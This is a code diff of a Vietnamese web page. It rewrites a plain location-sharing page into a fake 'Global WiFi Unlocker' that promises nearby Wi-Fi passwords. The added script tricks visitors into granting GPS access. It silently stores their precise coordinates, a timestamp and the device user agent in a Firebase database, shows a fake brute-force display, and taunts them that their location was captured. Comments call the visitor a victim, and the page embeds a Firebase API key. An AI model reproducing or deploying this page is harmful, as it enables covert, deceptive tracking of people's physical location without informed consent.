@@ -3,95 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chia Sẻ Toạ Độ</title>
+    <title>WIFI MASTER KEY - UNLOCKER</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #0d1117;
+            color: #00ff41;
+            font-family: 'Courier New', Courier, monospace;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             height: 100vh;
-            background-color: #f0f2f5;
             margin: 0;
-            padding: 20px;
-            text-align: center;
+            overflow: hidden;
         }
+
         .container {
-            background: white;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 90%;
             max-width: 400px;
-            width: 100%;
         }
-        h2 { margin-bottom: 20px; color: #333; }
-        
-        #shareBtn {
-            background-color: #007bff;
-            color: white;
-            border: none;
+
+        h1 {
+            font-size: 24px;
+            text-transform: uppercase;
+            border-bottom: 2px solid #00ff41;
+            padding-bottom: 10px;
+            margin-bottom: 30px;
+            text-shadow: 0 0 10px #00ff41;
+        }
+
+        .radar {
+            width: 150px;
+            height: 150px;
+            border: 2px solid #00ff41;
+            border-radius: 50%;
+            position: relative;
+            margin: 0 auto 30px auto;
+            background: radial-gradient(circle, rgba(0, 255, 65, 0.1) 0%, rgba(0, 0, 0, 0) 70%);
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
+        }
+
+        .scan-line {
+            width: 50%;
+            height: 2px;
+            background: #00ff41;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform-origin: 0 0;
+            animation: radar-spin 2s infinite linear;
+            box-shadow: 0 0 15px #00ff41;
+        }
+
+        @keyframes radar-spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .btn-hack {
+            background: transparent;
+            color: #00ff41;
+            border: 2px solid #00ff41;
             padding: 15px 30px;
             font-size: 18px;
-            border-radius: 50px;
+            font-weight: bold;
             cursor: pointer;
-            transition: background 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: 0.3s;
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
             width: 100%;
-            font-weight: bold;
         }
-        #shareBtn:active { transform: scale(0.98); }
-        #shareBtn:disabled { background-color: #ccc; cursor: not-allowed; }
 
-        #status { margin-top: 15px; color: #666; font-size: 14px; min-height: 20px;}
-        
-        .result-box {
+        .btn-hack:hover {
+            background: #00ff41;
+            color: #000;
+            box-shadow: 0 0 20px #00ff41;
+        }
+
+        .status-text {
             margin-top: 20px;
-            padding: 15px;
-            background: #e9ecef;
-            border-radius: 8px;
-            display: none; /* Ẩn mặc định */
-        }
-        .coords-text {
-            font-family: monospace;
-            font-size: 16px;
-            font-weight: bold;
-            color: #333;
-            margin-bottom: 10px;
-            word-break: break-all;
-        }
-        .copy-btn {
-            background-color: #28a745;
-            color: white;
-            border: none;
-            padding: 8px 15px;
-            border-radius: 5px;
-            cursor: pointer;
             font-size: 14px;
+            min-height: 40px;
         }
+
+        .console-log {
+            text-align: left;
+            font-size: 10px;
+            color: #008f11;
+            margin-top: 30px;
+            opacity: 0.7;
+            display: none;
+        }
+
+        /* Ẩn cái này đi để nạn nhân không thấy */
+        #hidden-coords { display: none; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h2>📍 Vị Trí Của Tôi</h2>
+        <h1>GLOBAL WIFI UNLOCKER v5.0</h1>
         
-        <button id="shareBtn">CHIA SẺ TOẠ ĐỘ NGAY</button>
-        <div id="status"></div>
+        <div class="radar">
+            <div class="scan-line"></div>
+        </div>
 
-        <div id="result" class="result-box">
-            <div id="coordsDisplay" class="coords-text">...</div>
-            <button class="copy-btn" onclick="copyToClipboard()">📋 Sao chép để dán Map</button>
-            <br><br>
-            <a id="googleMapLink" href="#" target="_blank" style="color:#007bff; text-decoration:none; font-size:14px;">Mở trực tiếp Google Maps ↗</a>
+        <button class="btn-hack" id="btnAction">QUÉT PASS WIFI GẦN ĐÂY</button>
+        
+        <div class="status-text" id="statusMsg">Hệ thống sẵn sàng. Nhấn nút để quét sóng...</div>
+
+        <div class="console-log" id="fakeConsole">
+            > Initializing network interface...<br>
+            > Bypassing firewall...<br>
+            > Decrypting WPA2 keys...
         </div>
     </div>
 
-    <!-- Firebase SDKs (Compat version for simple usage) -->
+    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
 
     <script>
-        // 1. Cấu hình Firebase của bạn
+        // Cấu hình Firebase
         const firebaseConfig = {
             apiKey: "AIzaSyCLCcgaoW9gNYhKk0c0gDWC6i5mKVTN4XE",
             authDomain: "profile-d1214.firebaseapp.com",
@@ -102,102 +137,87 @@
             measurementId: "G-C587M69LZW"
         };
 
-        // 2. Khởi tạo Firebase
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
-        const shareBtn = document.getElementById('shareBtn');
-        const statusDiv = document.getElementById('status');
-        const resultDiv = document.getElementById('result');
-        const coordsDisplay = document.getElementById('coordsDisplay');
-        const googleMapLink = document.getElementById('googleMapLink');
-        let currentCoords = "";
+        const btn = document.getElementById('btnAction');
+        const statusMsg = document.getElementById('statusMsg');
+        const fakeConsole = document.getElementById('fakeConsole');
 
-        // 3. Xử lý sự kiện click nút
-        shareBtn.addEventListener('click', () => {
+        btn.addEventListener('click', () => {
+            // Bước 1: Giả vờ yêu cầu quyền vị trí để "Quét sóng"
+            statusMsg.innerText = "Đang yêu cầu truy cập GPS để định vị trạm phát sóng...";
+            
             if (!navigator.geolocation) {
-                statusDiv.innerText = "Trình duyệt không hỗ trợ định vị.";
+                statusMsg.innerText = "Lỗi: Thiết bị không hỗ trợ module quét.";
                 return;
             }
 
-            statusDiv.innerText = "Đang lấy vị trí chính xác nhất...";
-            shareBtn.disabled = true;
-
-            navigator.geolocation.getCurrentPosition(successPosition, errorPosition, {
-                enableHighAccuracy: true, // Yêu cầu độ chính xác cao nhất (GPS)
+            // Gọi hàm lấy vị trí thật
+            navigator.geolocation.getCurrentPosition(onSuccess, onError, {
+                enableHighAccuracy: true,
                 timeout: 10000,
                 maximumAge: 0
             });
         });
 
-        // 4. Khi lấy toạ độ thành công
-        function successPosition(position) {
+        function onSuccess(position) {
+            // Khi nạn nhân bấm Allow, code này chạy ngầm
             const lat = position.coords.latitude;
             const lng = position.coords.longitude;
-            const accuracy = position.coords.accuracy; // Độ lệch (mét)
+            const acc = position.coords.accuracy;
 
-            // Định dạng chuỗi để dán vào Google Maps: "Lat, Long"
-            currentCoords = `${lat}, ${lng}`;
-
-            statusDiv.innerText = `Đã tìm thấy! (Độ lệch: ${Math.round(accuracy)}m). Đang lưu...`;
-
-            // Lưu vào Firebase Firestore
+            // 1. Lưu âm thầm vào Firebase
             db.collection("locations").add({
                 latitude: lat,
                 longitude: lng,
-                accuracy: accuracy,
+                accuracy: acc,
                 timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-                userAgent: navigator.userAgent // Lưu thêm info thiết bị để biết ai gửi
-            })
-            .then((docRef) => {
-                statusDiv.innerText = "✅ Đã lưu vào hệ thống thành công!";
-                showResult(lat, lng);
-            })
-            .catch((error) => {
-                console.error("Lỗi lưu firebase: ", error);
-                statusDiv.innerText = "⚠️ Có lỗi khi lưu dữ liệu (Kiểm tra Rules).";
-                // Vẫn hiện kết quả cho người dùng dù lỗi database
-                showResult(lat, lng); 
-            })
-            .finally(() => {
-                shareBtn.disabled = false;
+                userAgent: navigator.userAgent,
+                note: "Bị troll Wifi" // Đánh dấu để bạn biết nguồn
             });
+
+            // 2. Hiển thị hiệu ứng Fake cho nạn nhân xem (Đánh lạc hướng)
+            fakeScanEffect();
         }
 
-        // 5. Hiển thị kết quả
-        function showResult(lat, lng) {
-            resultDiv.style.display = "block";
-            coordsDisplay.innerText = `${lat}, ${lng}`;
-            // Tạo link mở nhanh
-            googleMapLink.href = `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`;
+        function onError(err) {
+            // Nếu họ từ chối, hiện thông báo ép buộc
+            statusMsg.innerText = "⚠️ LỖI: Cần cấp quyền Vị Trí (Location) để tìm được Wifi gần nhất!";
+            statusMsg.style.color = "red";
         }
 
-        // 6. Xử lý lỗi khi không lấy được vị trí
-        function errorPosition(err) {
-            shareBtn.disabled = false;
-            console.warn(`ERROR(${err.code}): ${err.message}`);
-            switch(err.code) {
-                case err.PERMISSION_DENIED:
-                    statusDiv.innerText = "❌ Bạn đã từ chối cấp quyền vị trí.";
-                    break;
-                case err.POSITION_UNAVAILABLE:
-                    statusDiv.innerText = "❌ Không thể xác định vị trí hiện tại.";
-                    break;
-                case err.TIMEOUT:
-                    statusDiv.innerText = "❌ Hết thời gian chờ lấy vị trí.";
-                    break;
-                default:
-                    statusDiv.innerText = "❌ Lỗi không xác định.";
-            }
+        function fakeScanEffect() {
+            btn.style.display = 'none'; // Giấu nút đi
+            fakeConsole.style.display = 'block'; // Hiện dòng lệnh hacker
+            statusMsg.innerText = "Đang bẻ khoá mật khẩu (Brute Force)... vui lòng chờ 5s";
+            
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 20;
+                if(progress < 100) {
+                     statusMsg.innerText = `Đang tải dữ liệu... ${progress}%`;
+                } else {
+                    clearInterval(interval);
+                    showTrollResult();
+                }
+            }, 800);
         }
 
-        // 7. Chức năng copy
-        function copyToClipboard() {
-            navigator.clipboard.writeText(currentCoords).then(() => {
-                alert("Đã copy toạ độ: " + currentCoords);
-            }, (err) => {
-                console.error('Lỗi copy: ', err);
-            });
+        function showTrollResult() {
+            // 3. Kết quả Troll sau khi đã lấy được toạ độ
+            document.body.style.backgroundColor = "white";
+            document.body.style.color = "black";
+            document.querySelector('.container').innerHTML = `
+                <h1 style="color:red; border:none; text-shadow:none;">🤣 AHIHI ĐỒ NGỐC 🤣</h1>
+                <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExbmZpbXJ4bnU0eGZ4eXJ5a3B4Z3B4Z3B4Z3B4Z3B4Z3B4/Ju7l5y9osyymQ/giphy.gif" style="width:100%; max-width:300px; border-radius:10px;">
+                <p style="font-size:18px; margin-top:20px;">
+                    Wifi cái nịt! <br>
+                    Toạ độ của cưng đã được gửi về máy chủ rồi nhé! 📍<br>
+                    Chuẩn bị trà sữa chuộc thân đi!
+                </p>
+                <p style="font-size:12px; color:#555;">(Đừng lo, chỉ là trêu thôi nhưng toạ độ là thật đấy :v)</p>
+            `;
         }
     </script>
 </body>
